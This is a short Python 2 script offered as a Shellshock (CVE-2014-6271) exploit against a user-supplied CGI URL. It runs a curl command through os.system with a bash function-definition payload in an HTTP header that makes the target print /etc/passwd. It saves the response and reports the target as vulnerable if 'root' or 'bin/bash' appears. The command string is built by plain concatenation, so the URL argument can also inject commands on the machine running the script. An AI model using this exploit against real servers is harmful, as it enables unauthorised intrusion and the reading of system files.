#!/usr/bin/env python
#coding:utf-8
import os
import sys
import re
print "f4ck ziwen cve 2014 6271 exp attacking!"
if sys.argv[1].startswith('-'):
    option = sys.argv[1][1:]
    if option == 'url':
        b=sys.argv[2]
        if not re.match("http",sys.argv[2]):
            print "URL格式错误 正确格式例如http://www.baidu.com/1.cgi"
        
        else:
            out=re.sub("\.|\/","",b)
            out=out[7:]
            print "shahdashhdd",out,b
            a="curl -H \'x: () { :;};a=`/bin/cat /etc/passwd`;echo \"a: $a\"' '"+b+"' -I -o "+out+"\"output\".txt"
            os.system(a)
            f = open(out+"output.txt", 'r')
            a=f.read()
            if re.search("root|bin\/bash",a):
                print "target possible have bug under is *nix passwd file"
                print a
            else:
                f.close()
                os.remove(out+"output.txt")
                print "possible dont have bug! or have a waf!"
    else:
        print "error! U can email to me U question (ziwen@21.wf)"
        print option

